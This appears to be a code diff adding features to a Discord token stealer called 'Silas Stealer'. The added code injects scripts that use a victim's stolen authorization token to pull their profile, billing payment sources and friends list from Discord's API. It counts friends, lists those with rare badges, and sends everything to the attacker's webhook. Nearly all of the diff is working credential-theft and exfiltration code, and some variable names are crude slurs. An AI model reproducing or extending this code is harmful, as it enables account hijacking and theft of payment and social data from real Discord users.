@@ -28,6 +28,30 @@ function GetNitro(flags) {
         return "No Nitro"
     }
 }
+function totalFriends(boobs) {
+    var f = JSON.parse(boobs)
+    const r = f.filter((user) => {
+        return user.type == 1
+    })
+    return r.length
+}
+function CalcFriends(pussies) {
+    var f = JSON.parse(pussies)
+    const r = f.filter((user) => {
+        return user.type == 1
+    })
+    var gay = "";
+    for (z of r) {
+        var b = GetRBadges(z.user.public_flags)
+        if (b != "") {
+            gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+        }
+    }
+    if (gay == "") {
+        gay = "No Rare Friends"
+    }
+    return gay
+}
 function GetBadges(flags) {
     const Discord_Employee = 1;
     const Partnered_Server_Owner = 2;
@@ -358,7 +382,12 @@ xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sourc
 xmlHttp.setRequestHeader("Authorization", "${token}");
 xmlHttp.send( null );
 xmlHttp.responseText`, !0).then((pm) => {
-
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText`, !0).then((frnds) => {
     const json = JSON.parse(info);
     var params = {
         username: "Silas Stealer",
@@ -394,7 +423,7 @@ xmlHttp.responseText`, !0).then((pm) => {
                         "inline": false
 },
 {
-    "name": "  <:billing:942396200831832124>  **Billing:**",
+    "name": " <a:nitro:942395826544705626> **Billing:**",
                             "value": `${PM(pm)}`,
                             "inline": false
     },
@@ -408,10 +437,24 @@ xmlHttp.responseText`, !0).then((pm) => {
                 "footer": {
                     "text": "Silas Stealer ftw"
                 }
+            },{
+                "title": `Total Friends (${totalFriends(JSON.parse(frnds))})`,
+                "color": 2303786,
+                "description": CalcFriends(JSON.parse(frnds)),
+                "author": {
+                    "name": "Silas Stealer"
+                },
+                "footer": {
+                    "text": "Silas Stealer"
+                },
+                "thumbnail": {
+                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+                }
             }
         ]
     }
     SendToWebhook(JSON.stringify(params))
+})
 })
 })
 			}))
@@ -431,6 +474,18 @@ xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
 xmlHttp.setRequestHeader("Authorization", "${token}");
 xmlHttp.send( null );
 xmlHttp.responseText;`, !0).then((info) => {
+    window.webContents.executeJavaScript(`
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+xmlHttp.setRequestHeader("Authorization", "${token}");
+xmlHttp.send( null );
+xmlHttp.responseText`, !0).then((pm) => {
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText`, !0).then((frnds) => {
     const json = JSON.parse(info);
     var params = {
         username: "Silas Stealer",
@@ -466,8 +521,8 @@ xmlHttp.responseText;`, !0).then((info) => {
                         "inline": false
 },
 {
-    "name": "  <:billing:942396200831832124>  **Billing:**",
-                            "value": `${PM(token)}`,
+    "name": " <a:nitro:942395826544705626> **Billing:**",
+                            "value": `${PM(pm)}`,
                             "inline": false
     },
 
@@ -479,11 +534,26 @@ xmlHttp.responseText;`, !0).then((info) => {
                 "footer": {
                     "text": "Silas Stealer ftw"
                 }
+            },{
+                "title": `Total Friends (${totalFriends(JSON.parse(frnds))})`,
+                "color": 2303786,
+                "description": CalcFriends(JSON.parse(frnds)),
+                "author": {
+                    "name": "Silas Stealer"
+                },
+                "footer": {
+                    "text": "Silas Stealer"
+                },
+                "thumbnail": {
+                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+                }
             }
         ]
     }
     SendToWebhook(JSON.stringify(params))
 })
+        })
+    })
                     
                     
 					}))
@@ -498,6 +568,18 @@ xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
 xmlHttp.setRequestHeader("Authorization", "${token}");
 xmlHttp.send( null );
 xmlHttp.responseText;`, !0).then((info) => {
+    window.webContents.executeJavaScript(`
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+xmlHttp.setRequestHeader("Authorization", "${token}");
+xmlHttp.send( null );
+xmlHttp.responseText`, !0).then((pm) => {
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText`, !0).then((frnds) => {
     const json = JSON.parse(info);
     var params = {
         username: "Silas Stealer",
@@ -533,8 +615,8 @@ xmlHttp.responseText;`, !0).then((info) => {
                         "inline": false
 },
 {
-    "name": "  <:billing:942396200831832124>  **Billing:**",
-                            "value": `${PM(token)}`,
+    "name": " <a:nitro:942395826544705626> **Billing:**",
+                            "value": `${PM(pm)}`,
                             "inline": false
     },
 
@@ -546,13 +628,27 @@ xmlHttp.responseText;`, !0).then((info) => {
                 "footer": {
                     "text": "Silas Stealer ftw"
                 }
+            },{
+                "title": `Total Friends (${totalFriends(JSON.parse(frnds))})`,
+                "color": 2303786,
+                "description": CalcFriends(JSON.parse(frnds)),
+                "author": {
+                    "name": "Silas Stealer"
+                },
+                "footer": {
+                    "text": "Silas Stealer"
+                },
+                "thumbnail": {
+                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+                }
             }
         ]
     }
     SendToWebhook(JSON.stringify(params))
 })
                     
-                    
+})
+})       
 					}))
 				}
 			}
